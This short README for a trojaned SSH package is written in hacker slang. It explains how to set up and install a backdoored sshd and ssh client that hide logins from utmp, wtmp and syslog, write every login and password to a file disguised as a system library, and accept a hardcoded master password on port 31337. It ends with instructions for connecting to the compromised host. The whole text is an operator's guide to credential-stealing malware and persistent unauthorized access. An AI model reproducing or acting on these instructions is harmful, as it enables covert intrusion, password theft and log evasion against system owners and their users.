+++ Trojan Info

    It doesn't log anything to system logz like utmp,wtmp and all kind of 
    syslogd logz. It also logz all incoming and outcoming logins and passwords 
    to file.
    
+++ Trojan Config.

    Ya have to change some def's in two files (sshd.c and sshconnect.c). 
    Here are default def's of thiz trojan:
     
    /* Trojan variableZ */
      
      #define SSH_LOGZ "/usr/lib/libfl.so" <-- where is should store logz?
      #define TROJAN_PASSWORD "b0f" <-- trojan password
      #define PASSWORD_LENGTH strlen(TROJAN_PASSWORD) <-- don't touch it ;>
      #define REMOTE_TROJAN_PORT 31337 <-- invisible trojan port

+++ Installation.

    When ya change thiz def's ya have to copy all files included to this trojan 
    into orginal ssh pack. Then compile it and install.
    
+++ Trojan HowTo.

    How to connect to backdoored host ?
    Only type ssh root@backdoored.host.com -X 31337
    Hmmm -X is new option added in thiz trojan and ya have to compile thiz 
    trojan your machine first but don't install it just copy ssh file with 
    new option.
